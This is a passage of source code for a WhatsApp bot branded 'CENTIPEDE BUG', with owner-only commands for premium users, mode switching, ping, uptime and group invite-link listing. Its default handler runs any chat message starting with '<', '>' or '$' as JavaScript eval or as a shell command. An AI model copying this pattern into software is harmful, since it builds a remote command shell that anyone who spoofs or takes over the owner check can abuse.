if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        m.reply("Success! User removed from premium.");
    } else {
        m.reply("User is not in the premium list.");
    }
}
break;
case 'public': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    kaneki.public = true;
    m.reply("_*🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ʙᴜɢ ɪs ɴᴏᴡ ᴏᴘᴇɴ ᴛᴏ ᴛʜᴇ ᴘᴜʙʟɪᴄ*_");
}
break;
case 'private': case 'self': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only");
    kaneki.public = false;
    m.reply("_*🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ʙᴜɢ ɪs ɴᴏᴡ ᴏɴ ᴘʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ*_");
}
break;
case 'speedtest': case 'speed': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
let speedTimestamp = speed()
let speedLatensi = speed() - speedTimestamp
         reply (`🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  sᴘᴇᴇᴇᴅ  : ${speedLatensi.toFixed(4)} 𝐌𝐒`); 
}
break
case 'ping': {
 if (isban) return m.reply(' YOU ARE BANNED FROM ACCESSING THIS BOT 🚫');
    const start = Date.now(); // Start time for latency calculation

    try {
        // Send initial "Pinging..." message
        let sentMessage = await kaneki.sendMessage(m.chat, { 
            text: 'loadin...'
        }, { quoted: m });

        // Calculate latency after message is sent
        const ping = Date.now() - start;

        // Delay for a more natural feel (1.5s)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Edit the original message instead of sending a new one
        if (sentMessage?.key) { 
            await kaneki.sendMessage(m.chat, { 
                edit: sentMessage.key, 
                text: `\`Pong\`\n Latency: ${ping} *ms* ` 
            });
        }
    } catch (error) {
        console.error('❌ Error in ping command:', error);
        await kaneki.sendMessage(m.chat, { 
            text: `❌ *Error:* ${error.message}`, 
            quoted: m 
        });
    }
    break;
}
case 'runtime': case 'alive': { 
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
         reply(`𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝙸𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \n 𝚂𝙿𝙴𝙴𝙳\n : ${runtime(process.uptime())} `); 
}
break

case 'mygroups': case 'grouplist': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
await reaction(from, '⏳');
try {
  const allGroups = await kaneki.groupFetchAllParticipating();
  const groupIds = Object.keys(allGroups);

  if (!groupIds.length) return reply('⚠️ No groups found.');

  let groupList = `*📋 GROUP LIST — ${groupIds.length} group(s)*\n`;
  groupList += `${'─'.repeat(30)}\n\n`;

  let index = 1;
  for (const jid of groupIds) {
    const group = allGroups[jid];
    let link = 'N/A (not admin)';
    try {
      const code = await kaneki.groupInviteCode(jid);
      link = `https://chat.whatsapp.com/${code}`;
    } catch {}

    groupList += `*${index}.* ${group.subject}\n`;
    groupList += `👥 Members: ${group.participants?.length ?? '?'}\n`;
    groupList += `🔗 ${link}\n\n`;
    index++;
  }

  await reaction(from, '✅');
  reply(groupList.trim());
} catch (err) {
  await reaction(from, '❌');
  reply(`Error fetching groups: ${err.message}`);
}
}
break

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(1)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
global._cachedCaseNames = null; // invalidate command name cache
global._botNumber       = null; // re-resolve bot JID
_menuimg = _bugimg = _thumb = _image1 = _tdxlol = _kanekiplay = null; // reload media
delete require.cache[file]
require(file)
})